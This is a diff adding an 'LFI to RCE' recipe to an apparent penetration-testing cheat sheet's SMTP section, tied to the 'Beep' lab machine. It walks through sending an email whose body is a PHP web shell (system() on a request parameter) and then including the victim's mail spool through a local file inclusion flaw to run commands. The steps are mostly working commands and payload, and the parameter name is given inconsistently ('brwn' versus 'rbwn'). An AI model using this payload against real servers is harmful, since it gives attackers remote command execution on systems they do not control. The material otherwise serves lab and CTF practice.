@@ -208,6 +208,39 @@ MAIL FROM:root
 RCPT TO:root
 250 root... Recipient ok
 ```
+
+**Mail LFI to RCE Exploit**
+[Beep](https://www.youtube.com/watch?v=XJmBpOd__N8&t=963s)
+1. Access the SMTP server.
+```
+telnet [IP] 25
+```
+2. Confirm that an assumed user is on the box. This is the user we'll send an email to to exploit the LFI in the web application.
+```
+VRFY [user]@localhost
+```
+3. Create a new mail to the confirmed user on the box.
+    - Note that the 'valid.domain.com' section is the value of what is returned from the 'HELO localhost' command for the SMTP server.
+    - Note that you need a CRLF after the last line with a period to complete the email and send it to the recipient.
+```
+HELO localhost
+MAIL FROM:example@domain.com
+RCPT TO:[valid_user]@[valid.domain.com]
+DATA
+This is a test message.
+<?php echo system($_REQUEST['brwn']); ?>
+
+.
+```
+4. Go to the web application and abuse the LFI vulnerability to navigate to the file location where our mail was sent and stored to execute the PHP script.
+```
+.../var/mail/[user]
+```
+5. If we're able to navigate here with our LFI, then we have command execution through the 'brwn' parameter.
+```
+.../var/mail/[user]&rbwn=[command]
+```
+
 ********************************************************************************
 
 #### 53 DNS
